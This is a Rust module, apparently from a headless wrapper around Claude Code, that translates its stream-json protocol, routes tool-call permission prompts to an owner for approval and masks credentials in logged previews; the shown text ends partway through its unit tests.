//! Claude Code's stream-json protocol, as the headless wrapper speaks it.
//!
//! The wrapper runs one persistent `claude -p --input-format stream-json --output-format
//! stream-json --verbose` process. Each input is one `user` line carrying the caller's own
//! `uuid`; Claude Code answers with `command_lifecycle` lines (`queued`, `started`, `completed`,
//! `cancelled`) whose `command_uuid` is that ID, which is how a queue item settles on "the model
//! started it". Observed with Claude Code 2.1.310: an input sent mid-turn starts between tool
//! calls inside the running turn; inputs sent while idle run in order, one turn each;
//! `system/init` opens every turn; `result` closes it; an interrupt is a `control_request` that
//! ends the running input `cancelled` and the turn `error_during_execution`; `--resume` keeps
//! the session with stream-json input.
//!
//! Permission prompts (`#671 headless-approval-surface`): with `--permission-prompts host
//! --permission-prompt-tool stdio`, a tool call that needs approval arrives as a
//! `control_request` of subtype `can_use_tool` (`tool_name`, `input`, `description`,
//! `blocked_path`, `tool_use_id`, and for a hook's or classifier's `ask` a `decision_reason` with
//! its `decision_reason_type`), and the harness waits for a `control_response` whose `response`
//! is `{"behavior": "allow", "updatedInput": ...}` or `{"behavior": "deny", "message": ...}`.
//! A hook that refuses outright (exit 2, or `permissionDecision: deny`) never asks: its call ends
//! as an error `tool_result` whose `tool_result_meta` entry says `permission_decision: {decision:
//! reject, source: hook}`. A prompt the harness drops (its turn interrupted) is withdrawn with a
//! `control_cancel_request` naming its `request_id`. Observed with Claude Code 2.1.310.
//!
//! This module only translates. It holds no state and does no I/O except reading a transcript
//! during recovery.

use std::fs::File;
use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};

use serde_json::{json, Value};

use super::events::{excerpt, SUMMARY_BYTES};
use super::reply::{self, ReplyCall};

/// Most lines of a tool result kept as its preview.
pub const PREVIEW_LINES: usize = 8;
/// Longest line of a tool result preview, in bytes.
pub const PREVIEW_LINE_BYTES: usize = 200;

/// Longest denial or refusal text kept in an event, in bytes.
pub const DENIAL_BYTES: usize = 4000;
/// Longest call detail a permission prompt shows the owner, in bytes.
pub const DETAIL_BYTES: usize = 3000;

/// Lowest Claude Code version the wrapper was tested with.
pub const TESTED_VERSION: &str = "2.1.310";

/// One input's lifecycle state, from `command_lifecycle`.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum InputState {
    /// The harness holds the input; the model has not seen it.
    Queued,
    /// The model has the input in context.
    Started,
    /// The input's turn finished.
    Completed,
    /// The input was dropped (before it started) or its turn interrupted (after).
    Cancelled,
}

/// What one stream-json line means to the wrapper.
#[derive(Clone, Debug, PartialEq)]
pub enum Signal {
    /// An input changed state.
    Input {
        /// The caller's input UUID.
        uuid: String,
        /// Its new state.
        state: InputState,
    },
    /// A turn's opening `system/init`.
    Init {
        /// Harness version.
        version: String,
        /// Model in use.
        model: String,
        /// Permission mode in force.
        permission_mode: String,
        /// Session identifier.
        session: String,
        /// Number of tools offered to the model.
        tools: usize,
    },
    /// Final prose of one assistant message block.
    Text(String),
    /// The model called a tool.
    ToolStarted {
        /// Tool call identifier.
        id: String,
        /// Tool name.
        tool: String,
        /// Bounded, masked summary of the call.
        summary: String,
        /// The message the call sends, when it is a recognised reply or send command.
        reply: Option<ReplyCall>,
    },
    /// A tool call returned.
    ToolCompleted {
        /// Tool call identifier.
        id: String,
        /// False when the result is marked as an error.
        ok: bool,
        /// Size of the result text, in bytes.
        bytes: usize,
        /// The first lines of the result text, bounded and masked ([`output_preview`]).
        preview: Vec<String>,
        /// Number of lines in the result text.
        lines: usize,
        /// Why the call never ran, when the harness or a hook refused it.
        denial: Option<Denial>,
    },
    /// The harness asks whether a tool call may run, and waits for the answer.
    PermissionRequest(PermissionRequest),
    /// The harness withdrew a permission prompt it asked, unanswered.
    PermissionCancelled {
        /// The withdrawn request's identifier.
        request_id: String,
    },
    /// A control request the wrapper does not serve; it is answered with an error.
    UnknownControlRequest {
        /// The request's identifier.
        request_id: String,
        /// Its subtype.
        subtype: String,
    },
    /// The turn ended.
    Result {
        /// `success`, `error_during_execution`, or another harness subtype.
        subtype: String,
        /// Wall time of the turn in milliseconds.
        duration_ms: Option<u64>,
        /// Token usage of the turn.
        usage: Value,
        /// Cost of the turn in US dollars, when reported.
        cost_usd: Option<f64>,
        /// Refused tool calls: `(tool, summary, tool_use_id)`.
        denials: Vec<(String, String, String)>,
    },
    /// Compaction began.
    CompactStarted,
    /// Compaction finished.
    CompactCompleted {
        /// `manual` or `auto`.
        trigger: String,
        /// Tokens before.
        pre_tokens: Option<u64>,
        /// Tokens after.
        post_tokens: Option<u64>,
    },
    /// The answer to one of the wrapper's control requests.
    ControlResponse {
        /// The request identifier the wrapper chose.
        request_id: String,
        /// The response body.
        body: Value,
    },
}

/// Why a tool call never ran.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Denial {
    /// Who refused it: `hook`, `approval` (an answer to the wrapper's prompt), `no-approval-surface`
    /// (nobody could be asked), or the harness's own `permission_decision.source`.
    pub source: String,
    /// The refusal text the model got, masked and bounded ([`DENIAL_BYTES`]), lines kept.
    pub reason: String,
}

/// One `can_use_tool` permission prompt.
#[derive(Clone, Debug, PartialEq)]
pub struct PermissionRequest {
    /// The harness's request identifier, echoed in the answer.
    pub request_id: String,
    /// Tool name.
    pub tool: String,
    /// The call's input, returned unchanged as `updatedInput` when it is approved.
    pub input: Value,
    /// Bounded, masked summary of the call ([`tool_summary`]).
    pub summary: String,
    /// What the call would do, for the owner to judge ([`approval_detail`]).
    pub detail: String,
    /// Whether `detail` shows the whole call, unmasked and uncut.
    pub complete: bool,
    /// The hook's or classifier's reason for asking, or the harness's description of the call.
    pub reason: String,
    /// What asked: `hook`, `classifier`, ..., or `rule` when the harness gave no reason type.
    pub reason_type: String,
    /// The path outside the allowed directories that made it ask, if any.
    pub blocked_path: Option<String>,
    /// The tool call identifier.
    pub tool_use_id: String,
}

/// The arguments the wrapper always passes, before the session and any operator arguments.
#[must_use]
pub fn protocol_arguments() -> Vec<String> {
    [
        "-p",
        "--input-format",
        "stream-json",
        "--output-format",
        "stream-json",
        "--verbose",
    ]
    .iter()
    .map(|argument| (*argument).to_owned())
    .collect()
}

/// The operator arguments as the harness gets them. With `approvals` (the default), permission
/// prompts go to the wrapper (`--permission-prompts host --permission-prompt-tool stdio`), which
/// asks the owner ([`super::approval`]); without, `--permission-prompts none` is added, so no tool
/// call can wait for a human and anything that would prompt is denied. An operator's own
/// `--permission-prompts` wins either way: `none` turns approvals off.
#[must_use]
pub fn effective_arguments(arguments: &[String], approvals: bool) -> Vec<String> {
    let mut effective = arguments.to_vec();
    match prompts_target(arguments) {
        None if approvals => effective.extend(
            [
                "--permission-prompts",
                "host",
                "--permission-prompt-tool",
                "stdio",
            ]
            .map(str::to_owned),
        ),
        None => effective.extend(["--permission-prompts".to_owned(), "none".to_owned()]),
        Some(target) if target == "host" && approvals => {
            effective.extend(["--permission-prompt-tool".to_owned(), "stdio".to_owned()]);
        }
        Some(_) => {}
    }
    effective
}

/// The operator's `--permission-prompts` value, when given.
#[must_use]
pub fn prompts_target(arguments: &[String]) -> Option<String> {
    let mut iterator = arguments.iter();
    while let Some(argument) = iterator.next() {
        if let Some(value) = argument.strip_prefix("--permission-prompts=") {
            return Some(value.to_owned());
        }
        if argument == "--permission-prompts" {
            return Some(iterator.next().cloned().unwrap_or_default());
        }
    }
    None
}

/// Whether the harness started with `arguments` (the operator's) sends permission prompts to
/// the wrapper.
#[must_use]
pub fn asks_wrapper(arguments: &[String], approvals: bool) -> bool {
    approvals && prompts_target(arguments).is_none_or(|target| target == "host")
}

/// Operator arguments the wrapper owns or that would let the harness wait for a human.
pub const RESERVED_ARGUMENTS: &[&str] = &[
    "-p",
    "--print",
    "--input-format",
    "--output-format",
    "--verbose",
    "--session-id",
    "-r",
    "--resume",
    "-c",
    "--continue",
    "--fork-session",
    "--bare",
    "--replay-user-messages",
    "--include-partial-messages",
    "--permission-prompt-tool",
];

/// Refuse operator arguments that the wrapper must control.
pub fn validate_arguments(arguments: &[String]) -> Result<(), String> {
    for argument in arguments {
        let name = argument.split('=').next().unwrap_or(argument);
        if RESERVED_ARGUMENTS.contains(&name) {
            return Err(format!(
                "harness argument {name} is set by the headless wrapper and cannot be given"
            ));
        }
        if argument.contains('\0') || argument.is_empty() {
            return Err("harness arguments must be nonempty and NUL-free".to_owned());
        }
    }
    Ok(())
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

/// Whether `text` is a hyphenated UUID.
#[must_use]
pub fn is_uuid(text: &str) -> bool {
    let bytes = text.as_bytes();
    bytes.len() == 36
        && bytes.iter().enumerate().all(|(index, byte)| {
            if matches!(index, 8 | 13 | 18 | 23) {
                *byte == b'-'
            } else {
                byte.is_ascii_hexdigit()
            }
        })
}

/// A fresh random version-4 UUID: the harness input ID of one delivery attempt, and a new
/// agent's session.
pub fn random_uuid() -> std::io::Result<String> {
    let mut bytes = [0u8; 16];
    std::io::Read::read_exact(&mut File::open("/dev/urandom")?, &mut bytes)?;
    bytes[6] = (bytes[6] & 0x0f) | 0x40;
    bytes[8] = (bytes[8] & 0x3f) | 0x80;
    let text = hex(&bytes);
    Ok(format!(
        "{}-{}-{}-{}-{}",
        &text[..8],
        &text[8..12],
        &text[12..16],
        &text[16..20],
        &text[20..]
    ))
}

/// The stdin line that hands `text` to the harness as input `uuid`.
#[must_use]
pub fn input_line(uuid: &str, text: &str, session: &str) -> String {
    let mut line = json!({
        "type": "user",
        "message": {"role": "user", "content": text},
        "uuid": uuid,
        "session_id": session,
        "parent_tool_use_id": null,
    })
    .to_string();
    line.push('\n');
    line
}

/// The stdin line that interrupts the running turn.
#[must_use]
pub fn interrupt_line(request_id: &str) -> String {
    let mut line = json!({
        "type": "control_request",
        "request_id": request_id,
        "request": {"subtype": "interrupt"},
    })
    .to_string();
    line.push('\n');
    line
}

/// The stdin line that answers permission prompt `request_id`: allow the call unchanged
/// (`input` as `updatedInput`), or deny it with `message`, which the model reads as the tool's
/// error.
#[must_use]
pub fn permission_answer_line(
    request_id: &str,
    allow: bool,
    input: &Value,
    message: &str,
) -> String {
    let response = if allow {
        json!({"behavior": "allow", "updatedInput": input})
    } else {
        json!({"behavior": "deny", "message": message})
    };
    let mut line = json!({
        "type": "control_response",
        "response": {"subtype": "success", "request_id": request_id, "response": response},
    })
    .to_string();
    line.push('\n');
    line
}

/// The stdin line that refuses control request `request_id`, which the wrapper does not serve.
#[must_use]
pub fn control_error_line(request_id: &str, error: &str) -> String {
    let mut line = json!({
        "type": "control_response",
        "response": {"subtype": "error", "request_id": request_id, "error": error},
    })
    .to_string();
    line.push('\n');
    line
}

/// Replace values that look like credentials in `text`: the word after `Bearer `, and the value
/// after a `key=`, `key: ` or `--key ` whose name mentions a token, secret, password or key.
#[must_use]
pub fn mask_secrets(text: &str) -> String {
    const NAMES: [&str; 6] = ["token", "secret", "password", "passwd", "apikey", "api_key"];
    let words: Vec<&str> = text.split(' ').collect();
    let mut masked = Vec::with_capacity(words.len());
    let mut hide_next = false;
    for word in words {
        if hide_next && !word.is_empty() {
            masked.push("***".to_owned());
            hide_next = false;
            continue;
        }
        let lower = word.to_ascii_lowercase();
        let sensitive = NAMES.iter().any(|name| lower.contains(name)) || lower == "bearer";
        if sensitive {
            if let Some(position) = word.find(['=', ':']) {
                if position + 1 < word.len() {
                    masked.push(format!("{}***", &word[..=position]));
                    continue;
                }
                hide_next = true;
            } else if lower == "bearer" || lower.starts_with("--") {
                hide_next = true;
            }
        }
        masked.push(word.to_owned());
    }
    masked.join(" ")
}

/// A one-line, bounded, masked summary of a tool call: the command, path, pattern or
/// description it was given.
#[must_use]
pub fn tool_summary(tool: &str, input: &Value) -> String {
    let field = match tool {
        "Bash" => "command",
        "Read" | "Write" | "Edit" | "NotebookEdit" => "file_path",
        "Grep" | "Glob" => "pattern",
        "Task" | "Agent" => "description",
        "WebFetch" => "url",
        "WebSearch" => "query",
        _ => "",
    };
    let raw = input
        .get(field)
        .and_then(Value::as_str)
        .map(str::to_owned)
        .or_else(|| {
            input.as_object().and_then(|object| {
                object
                    .values()
                    .find_map(|value| value.as_str().map(str::to_owned))
            })
        })
        .unwrap_or_default();
    let flat: String = raw
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    excerpt(&mask_secrets(flat.trim()), SUMMARY_BYTES)
}

/// `word` looks like a credential: a known token prefix, a private-key armour line, or a long
/// run of base64 or URL-safe characters that mixes upper case, lower case and digits (so Git
/// object names and other lower-case hex stay readable).
fn credential_shaped(word: &str) -> bool {
    const PREFIXES: [&str; 10] = [
        "ghp_",
        "gho_",
        "ghs_",
        "ghu_",
        "github_pat_",
        "sk-",
        "xoxb-",
        "xoxp-",
        "AKIA",
        "eyJ",
    ];
    let trimmed = word.trim_matches(|c: char| matches!(c, '"' | '\'' | ',' | ';' | '(' | ')'));
    if PREFIXES
        .iter()
        .any(|prefix| trimmed.starts_with(prefix) && trimmed.len() >= prefix.len() + 12)
    {
        return true;
    }
    trimmed.len() >= 32
        && trimmed
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=' | '_' | '-'))
        && trimmed.chars().any(|c| c.is_ascii_uppercase())
        && trimmed.chars().any(|c| c.is_ascii_lowercase())
        && trimmed.chars().any(|c| c.is_ascii_digit())
}

/// One line of tool output made safe to keep: [`mask_secrets`], then every credential-shaped
/// word replaced by `***`.
#[must_use]
pub fn mask_output_line(line: &str) -> String {
    mask_secrets(line)
        .split(' ')
        .map(|word| if credential_shaped(word) { "***" } else { word })
        .collect::<Vec<_>>()
        .join(" ")
}

fn content_text(content: &Value) -> String {
    match content {
        Value::String(text) => text.clone(),
        Value::Array(blocks) => blocks
            .iter()
            .filter_map(|block| block.get("text").and_then(Value::as_str))
            .collect::<Vec<_>>()
            .join("\n"),
        _ => String::new(),
    }
}

/// The first `max_lines` lines of a tool result, each cut to [`PREVIEW_LINE_BYTES`] and masked
/// ([`mask_output_line`]), and the result's total line count. Trailing blank lines are not
/// counted; once a private key's armour appears, the rest of the preview is withheld.
#[must_use]
pub fn output_preview(text: &str, max_lines: usize) -> (Vec<String>, usize) {
    let text = text.trim_end();
    if text.is_empty() {
        return (Vec::new(), 0);
    }
    let total = text.lines().count();
    let mut preview = Vec::new();
    for line in text.lines().take(max_lines) {
        if line.contains("PRIVATE KEY-----") {
            preview.push("*** (private key withheld)".to_owned());
            break;
        }
        let flat: String = line
            .chars()
            .map(|c| if c == '\t' { ' ' } else { c })
            .filter(|c| !c.is_control())
            .collect();
        preview.push(excerpt(
            &mask_output_line(flat.trim_end()),
            PREVIEW_LINE_BYTES,
        ));
    }
    (preview, total)
}

/// What a call the owner is asked to approve would do: a shell command whole, otherwise the
/// call's input as indented JSON (so an edit shows its file and its text), with line breaks
/// and tabs kept, other control characters dropped, credential-shaped words masked
/// ([`mask_output_line`]) and the whole bounded by [`DETAIL_BYTES`]. The flag is false when
/// masking changed anything or the text was cut: then the owner cannot see the exact call, and
/// a chat approval is refused ([`super::approval`]).
#[must_use]
pub fn approval_detail(tool: &str, input: &Value) -> (String, bool) {
    let text = (tool == "Bash")
        .then(|| input.get("command").and_then(Value::as_str))
        .flatten()
        .map_or_else(
            || serde_json::to_string_pretty(input).unwrap_or_default(),
            str::to_owned,
        );
    let clean: String = text
        .chars()
        .filter(|c| matches!(c, '\n' | '\t') || !c.is_control())
        .collect();
    let masked = clean
        .lines()
        .map(|line| {
            if line.contains("PRIVATE KEY-----") {
                "*** (private key withheld)".to_owned()
            } else {
                mask_output_line(line)
            }
        })
        .collect::<Vec<_>>()
        .join("\n");
    let whole = masked == clean.trim_end_matches('\n') && clean.len() <= DETAIL_BYTES;
    (excerpt(&masked, DETAIL_BYTES), whole && clean == text)
}

/// A refusal's text made safe to keep: every line masked ([`mask_output_line`]), control
/// characters other than line breaks dropped, the whole bounded by [`DENIAL_BYTES`]; once a
/// private key's armour appears, the rest is withheld.
#[must_use]
pub fn denial_text(text: &str) -> String {
    let mut kept = Vec::new();
    for line in text.trim_end().lines() {
        if line.contains("PRIVATE KEY-----") {
            kept.push("*** (private key withheld)".to_owned());
            break;
        }
        let flat: String = line
            .chars()
            .map(|c| if c == '\t' { ' ' } else { c })
            .filter(|c| !c.is_control())
            .collect();
        kept.push(mask_output_line(flat.trim_end()));
    }
    excerpt(&kept.join("\n"), DENIAL_BYTES)
}

/// Text that Claude Code gives a call it refused without running it, when `tool_result_meta`
/// does not say so (an older harness): the source it implies.
fn denial_source_from_text(text: &str) -> Option<&'static str> {
    let text = text.trim_start();
    if text.starts_with("Permission for this tool use was denied. It requires approval, and this session has no approval surface") {
        Some("no-approval-surface")
    } else if text.starts_with("PreToolUse:") && text.contains("hook error") {
        Some("hook")
    } else if text.starts_with("Permission for this tool use was denied")
        || text.starts_with("Permission to use ")
    {
        Some("permission")
    } else {
        None
    }
}

/// Why the error result of call `id` never ran, from the line's `tool_result_meta` (or, without
/// one, its text): `None` for a call that ran and failed.
fn denial_of(line: &Value, id: &str, text: &str) -> Option<Denial> {
    let meta = line
        .get("tool_result_meta")
        .and_then(Value::as_array)
        .and_then(|entries| {
            entries
                .iter()
                .find(|entry| entry.get("id").and_then(Value::as_str) == Some(id))
        });
    let source = match meta.and_then(|entry| entry.get("permission_decision")) {
        Some(decision) if decision.get("decision").and_then(Value::as_str) == Some("reject") => {
            match decision.get("source").and_then(Value::as_str).unwrap_or("") {
                // The model sees `user_reject` when the wrapper's prompt was answered no.
                "user_reject" | "user_temporary" | "user_permanent" => "approval".to_owned(),
                "" => denial_source_from_text(text)
                    .unwrap_or("permission")
                    .to_owned(),
                other => other.to_owned(),
            }
        }
        Some(_) => return None,
        None => denial_source_from_text(text)?.to_owned(),
    };
    Some(Denial {
        source,
        reason: denial_text(text),
    })
}

fn content_bytes(content: &Value) -> usize {
    match content {
        Value::String(text) => text.len(),
        Value::Array(blocks) => blocks
            .iter()
            .map(|block| {
                block
                    .get("text")
                    .and_then(Value::as_str)
                    .map_or(0, str::len)
            })
            .sum(),
        _ => 0,
    }
}

/// Translate one stream-json line. Messages from sub-agents (`parent_tool_use_id` set) and
/// lines the wrapper does not use translate to nothing.
#[must_use]
pub fn parse(line: &Value) -> Vec<Signal> {
    let kind = line.get("type").and_then(Value::as_str).unwrap_or("");
    let subtype = line.get("subtype").and_then(Value::as_str).unwrap_or("");
    let text = |key: &str| {
        line.get(key)
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_owned()
    };
    let nested = !line.get("parent_tool_use_id").is_none_or(Value::is_null);
    match (kind, subtype) {
        ("command_lifecycle", _) => {
            let state = match line.get("state").and_then(Value::as_str) {
                Some("queued") => InputState::Queued,
                Some("started") => InputState::Started,
                Some("completed") => InputState::Completed,
                Some("cancelled") => InputState::Cancelled,
                _ => return Vec::new(),
            };
            vec![Signal::Input {
                uuid: text("command_uuid"),
                state,
            }]
        }
        ("system", "init") => vec![Signal::Init {
            version: text("claude_code_version"),
            model: text("model"),
            permission_mode: text("permissionMode"),
            session: text("session_id"),
            tools: line
                .get("tools")
                .and_then(Value::as_array)
                .map_or(0, Vec::len),
        }],
        ("system", "status")
            if line.get("status").and_then(Value::as_str) == Some("compacting") =>
        {
            vec![Signal::CompactStarted]
        }
        ("system", "compact_boundary") => {
            let metadata = line.get("compact_metadata").unwrap_or(line);
            let number = |key: &str| {
                metadata
                    .get(key)
                    .and_then(Value::as_u64)
                    .or_else(|| line.get(key).and_then(Value::as_u64))
            };
            vec![Signal::CompactCompleted {
                trigger: metadata
                    .get("trigger")
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_owned(),
                pre_tokens: number("pre_tokens"),
                post_tokens: number("post_tokens"),
            }]
        }
        ("assistant", _) if !nested => line
            .pointer("/message/content")
            .and_then(Value::as_array)
            .map(|blocks| {
                blocks
                    .iter()
                    .filter_map(|block| match block.get("type").and_then(Value::as_str) {
                        Some("text") => block
                            .get("text")
                            .and_then(Value::as_str)
                            .filter(|text| !text.trim().is_empty())
                            .map(|text| Signal::Text(text.to_owned())),
                        Some("tool_use") => {
                            let tool = block
                                .get("name")
                                .and_then(Value::as_str)
                                .unwrap_or("")
                                .to_owned();
                            let input = block.get("input").unwrap_or(&Value::Null);
                            let reply = (tool == "Bash")
                                .then(|| input.get("command").and_then(Value::as_str))
                                .flatten()
                                .and_then(reply::detect)
                                .map(|mut call| {
                                    call.text = call.text.map(|text| {
                                        text.lines()
                                            .map(mask_secrets)
                                            .collect::<Vec<_>>()
                                            .join("\n")
                                    });
                                    call
                                });
                            Some(Signal::ToolStarted {
                                id: block
                                    .get("id")
                                    .and_then(Value::as_str)
                                    .unwrap_or("")
                                    .to_owned(),
                                summary: tool_summary(&tool, input),
                                tool,
                                reply,
                            })
                        }
                        _ => None,
                    })
                    .collect()
            })
            .unwrap_or_default(),
        ("user", _) if !nested => line
            .pointer("/message/content")
            .and_then(Value::as_array)
            .map(|blocks| {
                blocks
                    .iter()
                    .filter(|block| {
                        block.get("type").and_then(Value::as_str) == Some("tool_result")
                    })
                    .map(|block| {
                        let content = block.get("content").unwrap_or(&Value::Null);
                        let text = content_text(content);
                        let (preview, lines) = output_preview(&text, PREVIEW_LINES);
                        let id = block
                            .get("tool_use_id")
                            .and_then(Value::as_str)
                            .unwrap_or("")
                            .to_owned();
                        let ok = block.get("is_error").and_then(Value::as_bool) != Some(true);
                        let denial = if ok {
                            None
                        } else {
                            denial_of(line, &id, &text)
                        };
                        Signal::ToolCompleted {
                            id,
                            ok,
                            bytes: content_bytes(content),
                            preview,
                            lines,
                            denial,
                        }
                    })
                    .collect()
            })
            .unwrap_or_default(),
        ("result", _) => {
            let cost_usd = line
                .get("model_usage_since_last_result")
                .and_then(Value::as_object)
                .map(|models| {
                    models
                        .values()
                        .filter_map(|model| model.get("costUSD").and_then(Value::as_f64))
                        .sum()
                });
            let denials = line
                .get("permission_denials")
                .and_then(Value::as_array)
                .map(|denials| {
                    denials
                        .iter()
                        .map(|denial| {
                            let tool = denial
                                .get("tool_name")
                                .and_then(Value::as_str)
                                .unwrap_or("")
                                .to_owned();
                            let summary = tool_summary(
                                &tool,
                                denial.get("tool_input").unwrap_or(&Value::Null),
                            );
                            let id = denial
                                .get("tool_use_id")
                                .and_then(Value::as_str)
                                .unwrap_or("")
                                .to_owned();
                            (tool, summary, id)
                        })
                        .collect()
                })
                .unwrap_or_default();
            vec![Signal::Result {
                subtype: subtype.to_owned(),
                duration_ms: line.get("duration_ms").and_then(Value::as_u64),
                usage: line.get("usage").cloned().unwrap_or(Value::Null),
                cost_usd,
                denials,
            }]
        }
        ("control_request", _) => {
            let request_id = text("request_id");
            let request = line.get("request").unwrap_or(&Value::Null);
            let field = |key: &str| {
                request
                    .get(key)
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_owned()
            };
            match request.get("subtype").and_then(Value::as_str).unwrap_or("") {
                "can_use_tool" => {
                    let tool = field("tool_name");
                    let input = request.get("input").cloned().unwrap_or(Value::Null);
                    let reason = [field("decision_reason"), field("description")]
                        .into_iter()
                        .find(|reason| !reason.trim().is_empty())
                        .unwrap_or_default();
                    let reason_type = match field("decision_reason_type") {
                        kind if kind.is_empty() => "rule".to_owned(),
                        kind => kind,
                    };
                    let (detail, complete) = approval_detail(&tool, &input);
                    vec![Signal::PermissionRequest(PermissionRequest {
                        request_id,
                        summary: tool_summary(&tool, &input),
                        detail,
                        complete,
                        tool,
                        input,
                        reason: denial_text(&reason),
                        reason_type,
                        blocked_path: request
                            .get("blocked_path")
                            .and_then(Value::as_str)
                            .map(str::to_owned),
                        tool_use_id: field("tool_use_id"),
                    })]
                }
                subtype => vec![Signal::UnknownControlRequest {
                    request_id,
                    subtype: subtype.to_owned(),
                }],
            }
        }
        ("control_cancel_request", _) => vec![Signal::PermissionCancelled {
            request_id: text("request_id"),
        }],
        ("control_response", _) => {
            let response = line.get("response").cloned().unwrap_or(Value::Null);
            vec![Signal::ControlResponse {
                request_id: response
                    .get("request_id")
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_owned(),
                body: response,
            }]
        }
        _ => Vec::new(),
    }
}

/// Claude Code's transcript of `session` begun in `cwd`: `<config>/projects/<cwd with every
/// character other than an ASCII letter or digit replaced by '-'>/<session>.jsonl`, where
/// `<config>` is `$CLAUDE_CONFIG_DIR` or `~/.claude`.
#[must_use]
pub fn transcript_path(cwd: &Path, session: &str, config: &Path) -> PathBuf {
    let encoded: String = cwd
        .to_string_lossy()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    config
        .join("projects")
        .join(encoded)
        .join(format!("{session}.jsonl"))
}

/// Claude Code's configuration directory for this process.
#[must_use]
pub fn config_directory() -> Option<PathBuf> {
    std::env::var_os("CLAUDE_CONFIG_DIR")
        .filter(|value| !value.is_empty())
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|home| PathBuf::from(home).join(".claude")))
}

/// Whether the transcript at `path` proves that the model received input `uuid`: a `user` entry
/// with that `uuid` (an input sent while idle), or a `queued_command` attachment with that
/// `source_uuid` (an input absorbed mid-turn). A lone queue operation is not proof.
#[must_use]
pub fn transcript_received(path: &Path, uuid: &str) -> bool {
    let Ok(file) = File::open(path) else {
        return false;
    };
    for line in BufReader::new(file).lines() {
        let Ok(line) = line else { return false };
        if !line.contains(uuid) {
            continue;
        }
        let Ok(entry) = serde_json::from_str::<Value>(&line) else {
            continue;
        };
        let user = entry.get("type").and_then(Value::as_str) == Some("user")
            && entry.get("uuid").and_then(Value::as_str) == Some(uuid);
        let attachment = entry.get("attachment");
        let absorbed = attachment.is_some_and(|attachment| {
            attachment.get("type").and_then(Value::as_str) == Some("queued_command")
                && attachment.get("source_uuid").and_then(Value::as_str) == Some(uuid)
        });
        if user || absorbed {
            return true;
        }
    }
    false
}

/// The wrapper's declared contract, printed by `agentctl capabilities`.
#[must_use]
pub fn capabilities() -> Value {
    json!({
        "schema": "agentctl-harness-capabilities/v1",
        "harness": "claude",
        "tested_harness_version": TESTED_VERSION,
        "persistent": true,
        "mid_turn_input": true,
        "input_lifecycle": "by-caller-id",
        "receiver_record": "transcript-uuid",
        "interrupt": true,
        "cancel_queued": false,
        "compact": "command",
        "resume": "session-id",
        "self_started_turns": true,
        "send_boundary": "acceptance",
        "settle_on": "started",
        "streams_text": "per-message",
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lifecycle_init_text_tools_and_result_translate() {
        let lifecycle =
            json!({"type": "command_lifecycle", "command_uuid": "u1", "state": "started"});
        assert_eq!(
            parse(&lifecycle),
            vec![Signal::Input {
                uuid: "u1".to_owned(),
                state: InputState::Started
            }]
        );
        let init = json!({"type": "system", "subtype": "init", "claude_code_version": "2.1.310",
                          "model": "m", "permissionMode": "dontAsk", "session_id": "s", "tools": ["Bash", "Read"]});
        assert!(matches!(&parse(&init)[0], Signal::Init { tools: 2, .. }));
        let assistant = json!({"type": "assistant", "parent_tool_use_id": null, "message": {"content": [
            {"type": "thinking", "thinking": ""},
            {"type": "text", "text": "hello"},
            {"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "git push --token=abc origin"}}]}});
        assert_eq!(
            parse(&assistant),
            vec![
                Signal::Text("hello".to_owned()),
                Signal::ToolStarted {
                    id: "t1".to_owned(),
                    tool: "Bash".to_owned(),
                    summary: "git push --token=*** origin".to_owned(),
                    reply: None,
                }
            ]
        );
        let nested = json!({"type": "assistant", "parent_tool_use_id": "t9", "message": {"content": [{"type": "text", "text": "sub"}]}});
        assert!(parse(&nested).is_empty());
        let user = json!({"type": "user", "message": {"content": [
            {"type": "tool_result", "tool_use_id": "t1", "content": "abc", "is_error": true}]}});
        assert_eq!(
            parse(&user),
            vec![Signal::ToolCompleted {
                id: "t1".to_owned(),
                ok: false,
                bytes: 3,
                preview: vec!["abc".to_owned()],
                lines: 1,
                denial: None,
            }]
        );
        let result = json!({"type": "result", "subtype": "success", "duration_ms": 1795,
            "usage": {"input_tokens": 2}, "model_usage_since_last_result": {"m": {"costUSD": 0.25}, "n": {"costUSD": 0.5}},
            "permission_denials": [{"tool_name": "Bash", "tool_use_id": "t7", "tool_input": {"command": "touch x"}}]});
        let Signal::Result {
            subtype,
            cost_usd,
            denials,
            ..
        } = &parse(&result)[0]
        else {
            panic!()
        };
        assert_eq!(subtype, "success");
        assert_eq!(*cost_usd, Some(0.75));
        assert_eq!(
            denials,
            &vec![("Bash".to_owned(), "touch x".to_owned(), "t7".to_owned())]
        );
        let compact = json!({"type": "system", "subtype": "compact_boundary",
            "compact_metadata": {"trigger": "manual", "pre_tokens": 37807}});
        assert_eq!(
            parse(&compact),
            vec![Signal::CompactCompleted {
                trigger: "manual".to_owned(),
                pre_tokens: Some(37807),
                post_tokens: None
            }]
        );
        let control = json!({"type": "control_response", "response": {"subtype": "success", "request_id": "int-1", "response": {"still_queued": []}}});
        assert!(
            matches!(&parse(&control)[0], Signal::ControlResponse { request_id, .. } if request_id == "int-1")
        );
    }

    #[test]
    fn input_ids_are_fresh_uuids() {
        let first = random_uuid().unwrap();
        assert!(is_uuid(&first), "{first}");
        assert_eq!(&first[14..15], "4");
        assert_ne!(first, random_uuid().unwrap());
        let line: Value = serde_json::from_str(&input_line(&first, "hi", "s")).unwrap();
        assert_eq!(line["uuid"], first.as_str());
        assert_eq!(line["message"]["content"], "hi");
    }

    #[test]
    fn permission_prompts_go_to_the_wrapper_unless_turned_off() {
        let model = ["--model".to_owned(), "m".to_owned()];
        assert_eq!(
            effective_arguments(&model, true),
            vec![
                "--model",
                "m",
                "--permission-prompts",
                "host",
                "--permission-prompt-tool",
                "stdio"
            ]
        );
        assert!(asks_wrapper(&model, true));
        assert_eq!(
            effective_arguments(&model, false),
